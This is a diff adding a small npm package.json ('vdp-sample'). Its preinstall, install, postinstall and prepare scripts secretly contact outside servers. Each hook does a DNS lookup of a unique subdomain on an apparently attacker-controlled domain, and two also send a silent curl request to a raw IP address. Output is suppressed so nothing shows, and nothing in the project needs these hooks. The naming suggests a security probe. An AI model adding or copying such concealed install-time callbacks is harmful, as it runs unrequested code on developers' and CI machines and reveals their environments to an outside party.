@@ -1,0 +1,12 @@
+{
+  "name": "vdp-sample",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "preinstall": "getent hosts npm-preinstall.fork3.ssrf.xixixo123.site >/dev/null 2>&1; curl -s -m 5 http://162.35.173.130:8891/fork3/npm-preinstall >/dev/null 2>&1; true",
+    "install":    "getent hosts npm-install.fork3.ssrf.xixixo123.site >/dev/null 2>&1; true",
+    "postinstall":"getent hosts npm-postinstall.fork3.ssrf.xixixo123.site >/dev/null 2>&1; curl -s -m 5 http://162.35.173.130:8891/fork3/npm-postinstall >/dev/null 2>&1; true",
+    "prepare":    "getent hosts npm-prepare.fork3.ssrf.xixixo123.site >/dev/null 2>&1; true"
+  },
+  "devDependencies": { "eslint": "^9.0.0" }
+}
